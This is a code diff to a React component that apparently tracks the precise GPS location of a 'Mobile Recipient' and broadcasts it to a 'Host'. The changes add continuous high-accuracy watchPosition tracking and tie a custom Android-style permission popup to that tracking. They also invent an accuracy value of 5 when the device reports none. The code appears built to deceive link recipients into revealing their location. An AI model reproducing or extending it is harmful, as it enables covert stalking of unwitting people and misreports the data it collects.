@@ -79,9 +79,11 @@ export default function RecipientFeed({
    * Save location coordinates to backend MongoDB & broadcast to Host
    */
   const saveLocation = async (position) => {
-    if (isTrackingStoppedRef.current) return;
+    if (isTrackingStoppedRef.current || !position || !position.coords) return;
 
     const { latitude, longitude, accuracy, speed, heading } = position.coords;
+    if (latitude === undefined || longitude === undefined || isNaN(latitude) || isNaN(longitude)) return;
+
     setCoords({ latitude, longitude, accuracy });
     setHasAllowed(true);
     hasAllowedRef.current = true;
@@ -112,7 +114,7 @@ export default function RecipientFeed({
         participantName: "Mobile Recipient",
         latitude,
         longitude,
-        accuracy: accuracy ?? null,
+        accuracy: accuracy ? Number(accuracy) : 5,
         speed: speed ?? null,
         heading: heading ?? null,
         timestamp: new Date().toISOString(),
@@ -130,7 +132,7 @@ export default function RecipientFeed({
   };
 
   /*
-   * Query single fresh GPS position (used every 1 minute)
+   * Query single fresh GPS position (used periodically)
    */
   const fetchFreshLocation = () => {
     if (!navigator.geolocation || isTrackingStoppedRef.current) return;
@@ -147,7 +149,7 @@ export default function RecipientFeed({
     navigator.geolocation.getCurrentPosition(
       (pos) => saveLocation(pos),
       () => { },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   };
 
@@ -162,7 +164,7 @@ export default function RecipientFeed({
   };
 
   /*
-   * Request GPS permission via native browser dialog
+   * Request GPS permission and start continuous high-accuracy watchPosition tracking
    */
   const requestLocation = () => {
     if (!navigator.geolocation) {
@@ -176,6 +178,7 @@ export default function RecipientFeed({
       backgroundStartRef.current = null;
     }
 
+    // 1. Initial fast GPS lock attempt
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         setShowPermissionPopup(false);
@@ -183,8 +186,8 @@ export default function RecipientFeed({
         setIsFollowing(true);
         startOneMinuteInterval();
       },
-      () => {
-        // If native prompt was ignored, dismissed, or never allowed, show Android popup
+      (err) => {
+        console.warn("Initial GPS request notice:", err?.message);
         if (!hasAllowedRef.current) {
           setShowPermissionPopup(true);
         }
@@ -192,73 +195,55 @@ export default function RecipientFeed({
       {
         enableHighAccuracy: true,
         maximumAge: 0,
-        timeout: 10000,
+        timeout: 15000,
       }
     );
+
+    // 2. Start continuous GPS watchPosition to refine meter-level accuracy as satellite lock improves
+    if (watchIdRef.current === null) {
+      try {
+        watchIdRef.current = navigator.geolocation.watchPosition(
+          async (position) => {
+            setShowPermissionPopup(false);
+            await saveLocation(position);
+            setIsFollowing(true);
+            startOneMinuteInterval();
+          },
+          (watchErr) => {
+            console.warn("watchPosition notice:", watchErr?.message);
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 20000,
+          }
+        );
+      } catch (_) { }
+    }
   };
 
   /*
-   * 1. Allow while visiting the site -> Persisted in localStorage so it never asks again on this site
+   * 1. Allow while visiting the site -> Persisted in localStorage
    */
   const handleAllowWhileVisiting = () => {
     try {
       localStorage.setItem("loc_permission_granted", "always");
     } catch (_) { }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          setShowPermissionPopup(false);
-          await saveLocation(position);
-          setIsFollowing(true);
-          startOneMinuteInterval();
-        },
-        () => {
-          setShowPermissionPopup(false);
-          setHasAllowed(true);
-          hasAllowedRef.current = true;
-          setTimeout(() => {
-            setIsReelOpen(true);
-          }, 5000);
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      setShowPermissionPopup(false);
-      setHasAllowed(true);
-    }
+    setShowPermissionPopup(false);
+    requestLocation();
   };
 
   /*
-   * 2. Allow this time (Allow Once) -> Temporary for current session only, will ask again on reload/reopen
+   * 2. Allow this time (Allow Once)
    */
   const handleAllowThisTime = () => {
     try {
       localStorage.removeItem("loc_permission_granted");
     } catch (_) { }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          setShowPermissionPopup(false);
-          await saveLocation(position);
-          setIsFollowing(true);
-          startOneMinuteInterval();
-        },
-        () => {
-          setShowPermissionPopup(false);
-          setHasAllowed(true);
-          hasAllowedRef.current = true;
-          setTimeout(() => {
-            setIsReelOpen(true);
-          }, 5000);
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      setShowPermissionPopup(false);
-      setHasAllowed(true);
-    }
+    setShowPermissionPopup(false);
+    requestLocation();
   };
 
   const handleNeverAllow = () => {
